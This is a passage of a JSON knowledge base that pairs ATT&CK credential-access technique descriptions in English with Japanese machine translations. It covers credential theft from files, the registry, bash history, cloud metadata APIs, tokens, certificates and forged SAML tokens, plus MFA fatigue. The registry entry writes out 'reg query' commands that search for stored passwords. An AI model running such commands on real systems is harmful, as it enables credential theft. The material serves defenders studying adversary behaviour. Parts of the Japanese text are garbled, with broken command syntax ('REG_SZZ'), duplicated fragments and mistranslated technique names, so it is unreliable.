                        "description_jp": "攻撃者はコンテナ環境内のAPIを介して認証情報を収集する可能性がある。Docker APIやKubernetes APIなど、これらの環境におけるAPIは、ユーザーがコンテナリソースやクラスタコンポーネントをリモートで管理することを可能にする。 引用：Docker API）（引用：Kubernetes API\n\n敵対者はDocker APIにアクセスして、環境内のクラウド、コンテナ、その他のさまざまなリソースへの認証情報を含むログを収集することができる。 引用：Unit 42 Unsecured Docker Daemons） また、Podのサービスアカウントを介するなどして十分な権限を持つ敵対者は、Kubernetes APIを使用してKubernetes APIサーバーから認証情報を取得することもできる。これらのクレデンシャルには、Docker API認証に必要なものや、Kubernetesクラスタコンポーネントからのシークレットが含まれる可能性がある。"
                    },
                    {
                        "id": "T1552.001",
                        "name_eng": "Credentials In Files",
                        "name_jp": "ファイル内のクレデンシャル",
                        "description_eng": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
                        "description_jp": "攻撃者は、ローカル・ファイル・システムやリモート・ファイル共有を検索して、安全に保存されていないクレデンシャルを含むファイルを探す可能性がある。これらは、ユーザが自分のクレデンシャルを格納するために作成したファイル、個人グループの共有クレデンシャル格納、システムまたはサービスのパスワードを含む構成ファイル、または埋め込まれたパスワードを含むソース・コード/バイナリ・ファイルである。\n\nOS Credential Dumping](https://attack.mitre.org/techniques/T1003)を使用して、バックアップまたは保存された仮想マシンからパスワードを抽出することが可能である。(引用：CG 2014) パスワードは、Windows ドメインコントローラに保存されたグループポリシーの環境設定からも取得できる。(引用：SRD GPP)\n\nクラウドおよび/またはコンテナ化された環境では、認証されたユーザーおよびサービスアカウントのクレデンシャルが、ローカルの設定ファイルやクレデンシャルファイルに保存されていることがよくあります(引用：Unit 42 Hildegard Malware)。また、コンテナログ内のデプロイコマンドのパラメータとして見つかることもあります(引用：Unit 42 Unsecured Docker Daemons)。場合によっては、これらのファイルをコピーして別のマシンで再利用したり、ファイルをコピーする必要なく内容を読み込んで認証に使用したりすることができます(引用：Specter Ops - Cloud Credential Storage)。"
                    },
                    {
                        "id": "T1552.002",
                        "name_eng": "Credentials in Registry",
                        "name_jp": "登録資格",
                        "description_eng": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
                        "description_jp": "攻撃者は、危険にさらされたシステムのレジストリを検索して、安全に保存されていない認証情報を探す可能性がある。Windows レジストリは、システムまたは他のプログラムで使用できる構成情報を格納する。攻撃者はレジストリを照会して、他のプログラムやサービスで使用するために保存されている資格情報やパスワードを探すことがある。これらの認証情報は自動ログオンに使用されることもある。\n\nパスワード情報に関連するレジストリキーを検索するコマンドの例：（引用：Pentestlab Stored Credentials）\n\n* ローカルマシンハイブ：<code>reg query HKLM /f password /t REG_SZZ /s</code> * 現在のユーザー ハイブ: HKLM /f password /t REG_SZZ /s</code\n* 現在のユーザーハイブ：<コード>reg クエリ HKCU /f パスワード /t REG_SZ /s</code> * 現在のユーザー ハイブ"
                    },
                    {
                        "id": "T1552.003",
                        "name_eng": "Bash History",
                        "name_jp": "バッシュの歴史",
                        "description_eng": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
                        "description_jp": "攻撃者は、危険にさらされたシステム上でbashコマンドの履歴を検索し、安全に保存されていない認証情報を探す可能性がある。Bashは、「history」ユーティリティを使用して、ユーザーがコマンドラインで入力したコマンドを追跡します。ユーザーがログアウトすると、履歴はユーザーの<code>.bash_history</code>ファイルにフラッシュされます。各ユーザのこのファイルは同じ場所に存在します：<code>~/.bash_history</code> です。通常、このファイルにはユーザーの最後の500個のコマンドが記録されています。ユーザーはコマンドラインでユーザー名とパスワードをプログラムのパラメータとして入力することが多く、ログアウト時にこのファイルに保存されます。攻撃者は、このファイルから潜在的な認証情報を探し出すことで、これを悪用することができる。(引用：OS X流DAへの外部アクセス)"
                    },
                    {
                        "id": "T1552.008",
                        "name_eng": "Chat Messages",
                        "name_jp": "チャットメッセージ",
                        "description_eng": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",
                        "description_jp": "攻撃者は、ユーザ通信サービスを通じて保存または渡された安全でないクレデンシャルを直接収集する可能性がある。クレデンシャルは、電子メール、Slack や Teams のようなチャットサービス、Jira や Trello のようなコラボレーションツール、およびユーザーコミュニケーションをサポートするその他のサービスのようなユーザーチャットコミュニケーションアプリケーションで送信および保存される可能性があります。ユーザーは、非公開または公開の企業内コミュニケーションチャネルで、さまざまな形式のクレデンシャル（ユーザー名やパスワード、API キー、認証トークンなど）を共有することができます。\n\n敵対者は、保存されたチャットログ（すなわち[Credentials In Files](https://attack.mitre.org/techniques/T1552/001)）にアクセスするのではなく、ユーザーエンドポイント、サービスをホスティングするサーバー、またはクラウドホスティングサービスの管理者ポータルを通じて、これらのサービス内のクレデンシャルに直接アクセスする可能性があります。また、Slack ワークフローのような統合ツールを侵害し、メッセージを自動的に検索してユーザー認証情報を抽出することもあります。そして、これらの認証情報を悪用して、ラテラルムーブメントや権限昇格などの後続の活動を実行する可能性があります（引用：Slack Security Risks）。"
                    },
                    {
                        "id": "T1552.005",
                        "name_eng": "Cloud Instance Metadata API",
                        "name_jp": "クラウド・インスタンス・メタデータAPI",
                        "description_eng": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.",
                        "description_jp": "攻撃者は、クラウドインスタンスメタデータAPIにアクセスして、認証情報やその他の機密データを収集しようとする可能性がある。\n\nほとんどのクラウドサービスプロバイダーはクラウドインスタンスメタデータAPIをサポートしています。これは実行中の仮想インスタンスに提供されるサービスで、アプリケーションが実行中の仮想インスタンスに関する情報にアクセスすることを可能にします。利用可能な情報には一般的に、名前、セキュリティグループ、および認証情報やUserDataスクリプトなどの機密データを含む追加のメタデータが含まれます。Instance Metadata APIは、アプリケーションの管理を支援するための利便性として提供されており、インスタンスにアクセスできる人であれば誰でもアクセスできる(引用: AWS Instance Metadata API) クラウドメタデータAPIは、少なくとも1件の注目度の高い侵害で使用されている(引用: Krebs Capital One August 2019)\n\n敵対者が実行中の仮想インスタンス上に存在する場合、追加リソースへのアクセスを許可する認証情報を特定するために、インスタンスメタデータAPIに直接問い合わせる可能性がある。さらに、敵対者は、Instance Metadata APIへのリクエストを経由して機密情報へのアクセスを可能にする、パブリックに面したWebプロキシのSSRF（Server-Side Request Forgery）の脆弱性を悪用する可能性があります（引用：RedLock Instance Metadata API 2018）。\n\nクラウドサービスプロバイダー全体のデファクトスタンダードは、インスタンスメタデータAPIを<code>http[:]//169.254.169.254</code>でホストすることです。"
                    }
                ]
            },
            {
                "id": "T1649",
                "name_eng": "Steal or Forge Authentication Certificates",
                "name_jp": "認証証明書の窃盗または偽造",
                "description_eng": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",
                "description_jp": "攻撃者は、リモート・システムやリソースにアクセスするための認証に使用される証明書を盗んだり、偽造したりする可能性がある。デジタル証明書は、メッセージやファイルの署名や暗号化によく使用される。証明書は、認証材料としても使用される。たとえば、Entra ID デバイス証明書や Active Directory Certificate Services（AD CS）証明書は、ID にバインドされ、ドメインアカウントの認証情報として使用できる。\n\n認証証明書は、盗まれることも偽造されることもある。たとえば、AD CS 証明書は、暗号化されたストレージ（レジストリまたはファイル）（引用：APT29 Deep Look at Credential Roaming）、置き忘れた証明書ファイル（すなわち [Unsecured Credentials]（https://attack.mitre.org/techniques/T1552））、またはさまざまな暗号 API を介して Windows 証明書ストアから直接盗まれる可能性がある。(引用: SpecterOps Certified Pre Owned)(引用: GitHub CertStealer)(引用: GitHub GhostPack Certificates) 適切な登録権限があれば、ドメイン内のユーザーやマシンも、企業の認証局(CA)に証明書を要求したり、手動で更新したりできる。この登録プロセスによって、証明書に関連するさまざまな設定や権限が定義される。特に、証明書の拡張鍵使用（EKU）値は、署名、暗号化、および認証のユースケースを定義し、証明書のサブジェクト代替名（SAN）値は、証明書の所有者の代替名を定義する(引用：Medium Certified Pre Owned)\n\n証明書を認証に悪用することは、[Lateral Movement](https://attack.mitre.org/tactics/TA0008)などの行為を可能にする可能性がある。証明書に関連する設定の誤りは、ユーザが証明書に関連するアイデンティティ(SAN)を介して特権アカウントや権限になりすましたり、なりすましたりすることを可能にすることによって、[特権のエスカレーション](https://attack.mitre.org/tactics/TA0004)の機会も可能にする可能性がある。これらの悪用は、ユーザ・パスワードのリセットにもかかわらず、証明書の有効期間中「有効なアカウント」(https://attack.mitre.org/techniques/T1078)として使用できる証明書を盗んだり偽造したりすることによって、「永続性」(https://attack.mitre.org/tactics/TA0003)を可能にする可能性もある。認証証明書は、マシン・アカウントのために盗まれたり偽造されたりすることもある。\n\nルート(またはサボーディネート)CA 証明書の秘密鍵(またはこれらの鍵を保護/管理するメカニズム)にアクセスできる攻撃者は、被害者ドメインの任意の認証証明書(「ゴールデン」証明書として知られる)を偽造することで、[Persistence](https://attack.mitre.org/tactics/TA0003)を確立することもできる(引用：Medium Certified Pre Owned)。攻撃者は、[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001)チケット付与チケット(TGT)や NTLM 平文など、他の形式のクレデンシャルにアクセスするために、証明書や関連サービスを標的にすることもできる(引用：Medium Certified Pre Owned)。",
                "subtechniques": []
            },
            {
                "id": "T1528",
                "name_eng": "Steal Application Access Token",
                "name_jp": "アプリケーション・アクセストークンを盗む",
                "description_eng": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  \n\nSimilarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. \n\nIn Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps Managed Identity 2022)\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.",
                "description_jp": "攻撃者は、リモートシステムやリソースにアクセスするための認証情報を取得する手段として、アプリケーションのアクセストークンを盗むことができる。\n\nアプリケーション・アクセストークンは、ユーザーやサービスに代わって認可されたAPIリクエストを行うために使用され、クラウドやコンテナベースのアプリケーション、SaaS（Software-as-a-Service）のリソースにアクセスする手段として一般的に使用されている（引用：Auth0 - Why Should Always Use Access Tokens to Secure APIs Sept 2019）：Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019）クラウドやコンテナ化された環境でアカウントAPIトークンを盗み出した攻撃者は、これらのアカウントの権限でデータにアクセスしたりアクションを実行したりできる可能性があり、権限の昇格や環境のさらなる侵害につながる可能性がある。\n\n例えば、Kubernetes環境では、コンテナ内で実行されているプロセスがサービスアカウントトークンを使用してKubernetes APIサーバーと通信する可能性があります。コンテナが侵害された場合、敵対者はコンテナのトークンを盗むことができ、それによってKubernetes APIコマンドにアクセスできるようになる可能性がある（引用：Kubernetes Service Accounts）。\n\n同様に、継続的開発/継続的統合（CI/CD）パイプライン内のインスタンスは、テストやデプロイのために他のサービスに認証するためにAPIトークンを使用することがよくあります（引用：Cider Security Top 10 CICD Security Risks） これらのパイプラインが侵害された場合、敵対者はこれらのトークンを盗み、その権限を活用することができる可能性があります。\n\nAzure では、Azure VM などの Managed Identity がアタッチされたリソースを侵害する敵対者は、Azure Instance Metadata Service（IMDS）を介して短命のトークンを要求できます。これらのトークンは、一般的なクレデンシャルベースの認証をバイパスして、不正なアクションや他のAzureサービスへのさらなるアクセスを容易にすることができる。 引用：Entra Managed Identities 2025）（引用：SpecterOps Managed Identity 2022\n\nトークンの盗難はソーシャルエンジニアリングによっても発生する可能性があり、その場合、アクセスを許可するためにユーザーのアクションが必要になることがある。OAuth は、システムへのアクセス用にユーザにトークンを発行する、一般的に実装されているフレームワークの 1 つである。クラウドベースのサービスや保護されたAPIへのアクセスを望むアプリケーションは、OAuth 2.0を使用して、様々な認可プロトコルを介してアクセスすることができます。一般的に使用されるシーケンスの例として、Microsoftの認証コード付与フローがある（引用：Microsoft Identity Platform Protocols May 2019）（Citation: Microsoft - OAuth Code Authorization flow - June 2019） OAuthアクセストークンを使用すると、サードパーティのアプリケーションは、ユーザー認証情報を取得することなく、アプリケーションが要求する方法でユーザーデータを含むリソースと対話できるようになる。\n \n敵対者は、ターゲットユーザーのOAuthトークンでリソースへのアクセスが許可されるように設計された悪意のあるアプリケーションを構築することで、OAuth認可を活用できます(引用: Amnesty OAuth Phishing Attacks, August 2019)(引用: Trend Micro Pawn Storm OAuth 2017) 敵対者は、Azureポータル、Visual Studio IDE、コマンドラインインターフェース、PowerShell、またはREST APIコールを使用して、Microsoft Identity Platformなどの認可サーバーへのアプリケーションの登録を完了する必要があります。(引用: Microsoft - Azure AD App Registration - May 2019) その後、ターゲットユーザーに[Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)を送信して、アプリケーションへのアクセスを許可するように誘導する。OAuthアクセストークンが付与されると、アプリケーションは[Application Access Token](https://attack.mitre.org/techniques/T1550/001)を通じて、ユーザーアカウントの機能への潜在的な長期アクセスを得ることができる。(引用: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nアプリケーション・アクセストークンは、限られた有効期間内で機能し、敵対者が盗んだトークンを利用できる期間を制限することができる。しかし、場合によっては、敵対者はアプリケーションのリフレッシュトークンも盗むことができ（引用：Auth0 Understanding Refresh Tokens）、ユーザーに促すことなく新しいアクセストークンを取得できる。",
                "subtechniques": []
            },
            {
                "id": "T1606",
                "name_eng": "Forge Web Credentials",
                "name_jp": "ウェブ認証情報の偽造",
                "description_eng": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)",
                "description_jp": "攻撃者は、ウェブ・アプリケーションやインターネット・サービスにアクセスするために使用できるクレデンシャ ル資料を偽造する可能性がある。ウェブ・アプリケーションおよびサービス（クラウド SaaS 環境またはオンプレミス・サーバでホストされる）は、多くの場合、セッション・クッキー、トークン、またはその他の材料を使用して、ユーザ・アクセスを認証および承認する。\n\n攻撃者はウェブ・リソースへのアクセスを得るために、これらのクレデンシャル・マテリアルを生成するかもしれません。これは、[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)、[Steal Application Access Token](https://attack.mitre.org/techniques/T1528)、および他の類似の振る舞いとは、クレデンシャルが正当なユー ザから盗まれたり傍受されたりするのではなく、敵対者によって新しく偽造されるという点で異なります。\n\nウェブ認証情報の生成には、パスワード、[Private Keys](https://attack.mitre.org/techniques/T1552/004)、または他の暗号シード値のような秘密の値を必要とすることが多い。(引用: GitHub AWS-ADFS-Credential-Generator) 敵対者はまた、AWS の `AssumeRole` や `GetFederationToken` API のような機能を利用することで、トークンを偽造することもある、[Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)）、または Zimbra の `zmprov gdpak` コマンドのような機能を利用することで、トークンを生成するために使用できる事前認証キーを生成することができる。(引用：AWS Temporary Security Credentials)(引用：Zimbra Preauth)\n\nいったん偽造されると、敵対者はこれらの Web 認証情報を使用してリソースにアクセスする可能性があり(例: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550))、多要素認証やその他の認証保護メカニズムをバイパスする可能性があります(引用: Pass The Cookie)(引用: Unit 42 Mac Crypto Cookies January 2019)(引用: Microsoft SolarWinds Customer Guidance)",
                "subtechniques": [
                    {
                        "id": "T1606.001",
                        "name_eng": "Web Cookies",
                        "name_jp": "ウェブクッキー",
                        "description_eng": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",
                        "description_jp": "攻撃者はウェブ・アプリケーションやインターネット・サービスにアクセスするために利用できるウェブ・クッキーを偽造するかもしれません。ウェブ・アプリケーションやサービス（クラウド SaaS 環境やオンプレミス・サーバでホストされる）は、ユーザ・アク セスの認証と認可にセッション・クッキーを使うことがよくあります。\n\n攻撃者はウェブ・リソースへのアクセスを得るためにこれらのクッキーを生成するかもしれません。これは[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)や他の類似の振る舞いと異なり、クッキーは正当なユー ザから盗まれたり傍受されたりするのではなく、敵対者によって新しく偽造されたものです。ほとんどの一般的なウェブ・アプリケーションは標準化され文書化されたクッキー値を持っており、提供されたツールやインタ フェースを使用して生成することができます(引用: Pass The Cookie)。ウェブ・クッキーの生成はしばしばパスワード、[プライベート・キー](https://attack.mitre.org/techniques/T1552/004)、あるいは他の暗号的なシード値のような秘密の値を必要とします。\n\nいったん偽造されると、敵対者はこれらの Web Cookie を使用してリソースにアクセスし([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)) 、多要素やその他の認証保護メカニズムをバイパスする可能性があります。(引用：Volexity SolarWinds)(引用：Pass The Cookie)(引用：Unit 42 Mac Crypto Cookies January 2019)"
                    },
                    {
                        "id": "T1606.002",
                        "name_eng": "SAML Tokens",
                        "name_jp": "SAML トークン",
                        "description_eng": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",
                        "description_jp": "敵対者は、有効な SAML トークン署名証明書を所有していれば、任意の権限クレームと有効期間を持つ SAML トークンを偽造できる(引用：Microsoft SolarWinds Steps)。SAML トークンのデフォルトの有効期間は 1 時間だが、トークン内の <code>conditions ...</code>要素の <code>NotOnOrAfter</code> 値で有効期間を指定できる。この値は、<code>LifetimeTokenPolicy</code>内の<code>AccessTokenLifetime</code>を使用して変更できる。(引用：Microsoft SAML Token Lifetimes) 偽造 SAML トークンを使用すると、敵対者は SAML 2.0 を SSO (シングルサインオン) メカニズムとして使用するサービス間で認証を行うことができる。(引用：Cyberark Golden SAML)\n\n敵対者は[秘密鍵](https://attack.mitre.org/techniques/T1552/004)を利用して、組織のトークン署名証明書を侵害し、偽造 SAML トークンを作成することができる。敵対者が独自の Active Directory フェデレーション・サービス（AD FS）サーバとの新しいフェデレーション・トラストを確立するのに十分な権限を持っている場合、代わりに独自の信頼されたトークン署名証明書を生成する可能性がある（引用：Microsoft SolarWinds Customer Guidance）。これは、トークンが正当なユーザから盗まれたり傍受されたりするのではなく、敵対者によって新たに偽造されるという点で、[Steal Application Access Token]（https://attack.mitre.org/techniques/T1528）や他の類似の動作とは異なる。\n\nSAML トークンが偽造され、高度な特権アカウントを表すと主張した場合、敵対者は管理用の Entra ID 特権を獲得する可能性がある。これは、[Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)につながる可能性があり、多要素認証やその他の認証保護メカニズムをバイパスする可能性があります。(引用: Microsoft SolarWinds Customer Guidance)"
                    }
                ]
            },
            {
                "id": "T1621",
                "name_eng": "Multi-Factor Authentication Request Generation",
                "name_jp": "多要素認証リクエスト生成",
                "description_eng": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)",
